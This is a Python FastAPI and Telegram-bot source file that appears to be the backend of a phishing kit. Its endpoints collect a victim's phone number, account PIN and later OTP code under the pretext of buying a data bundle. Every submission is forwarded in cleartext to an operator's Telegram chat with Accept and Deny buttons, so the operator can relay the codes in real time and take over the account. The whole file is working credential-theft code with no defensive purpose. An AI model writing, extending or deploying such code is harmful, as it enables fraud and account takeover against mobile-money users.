import os
import uuid
from typing import Dict, Any, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")

transactions: Dict[str, Dict[str, Any]] = {}

# --- PYDANTIC MODELS ---
class LoginRequest(BaseModel):
    phone: str
    pin: str
    duration: str
    voice: int
    sms: int
    data: float
    price: str

class OTPRequest(BaseModel):
    phone: str
    otp: str
    duration: str
    price: str

# --- TELEGRAM BOT SETUP ---
# CRITICAL FIX: .updater(None) is required for Webhooks. 
# If you don't add this, the bot tries to poll and ignores webhooks!
ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()

async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the Accept/Deny button clicks safely"""
    query = update.callback_query
    
    try:
        # 1. Immediately stop the loading spinner on Telegram
        await query.answer(text="Processing...") 

        # 2. Parse the callback data
        data = query.data.split(":")
        action = data[0]
        tx_id = data[1]

        print(f"🔘 Button Clicked: {action} for transaction {tx_id}")

        # 3. Check if the transaction exists
        if tx_id in transactions:
            if action == "accept":
                transactions[tx_id]["status"] = "approved"
                try:
                    await query.edit_message_text(
                        text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass 
            elif action == "deny":
                transactions[tx_id]["status"] = "denied"
                try:
                    await query.edit_message_text(
                        text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass 
        else:
            # If Render went to sleep and wiped memory
            try:
                await query.edit_message_text(
                    text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted)",
                    parse_mode="HTML"
                )
            except Exception:
                pass

    except Exception as e:
        print(f"❌ Button Handler Error: {e}")

ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))

# --- FASTAPI LIFESPAN ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    print("Starting Telegram Bot...")
    await ptb_app.initialize()
    # We do NOT call ptb_app.start() here because we don't need the updater
    yield
    print("Shutting down Telegram Bot...")
    await ptb_app.shutdown()

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API ENDPOINTS ---

@app.post("/api/initiate-login")
async def initiate_login(req: LoginRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "login",
        "data": req.model_dump()
    }

    message = (
        f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔑 <b>PIN:</b> {req.pin}\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this login?</i>"
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:login"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:login")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Telegram Error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")

    return {"transaction_id": tx_id, "message": "Login request sent to admin"}


@app.post("/api/verify-otp")
async def verify_otp(req: OTPRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "otp",
        "data": req.model_dump()
    }

    message = (
        f"🔢 <b>NEW OTP ENTERED</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔢 <b>OTP Code:</b> <code>{req.otp}</code>\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this OTP?</i>"
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:otp"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:otp")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Telegram Error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")

    return {"transaction_id": tx_id, "message": "OTP request sent to admin"}


@app.get("/api/status/{tx_id}")
async def get_status(tx_id: str):
    if tx_id not in transactions:
        return {"status": "denied"} 
    
    return {"status": transactions[tx_id]["status"]}


# --- WEBHOOK ENDPOINTS ---

@app.post("/api/webhook/telegram")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
    if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid secret token")

    update_data = await request.json()
    print(f"📥 Received Webhook: {update_data.get('update_id')}")
    
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    
    return {"status": "ok"}

@app.get("/api/webhook/set")
async def set_telegram_webhook():
    base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("VERCEL_URL")
    
    if not base_url:
        raise HTTPException(status_code=500, detail="External URL environment variable not set")

    base_url = base_url.rstrip("/")
    webhook_url = f"https://{base_url}/api/webhook/telegram" if not base_url.startswith("http") else f"{base_url}/api/webhook/telegram"
    
    try:
        await ptb_app.bot.set_webhook(
            url=webhook_url,
            secret_token=WEBHOOK_SECRET,
            drop_pending_updates=True
        )
        return {"status": "success", "webhook_url": webhook_url}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to set webhook: {e}")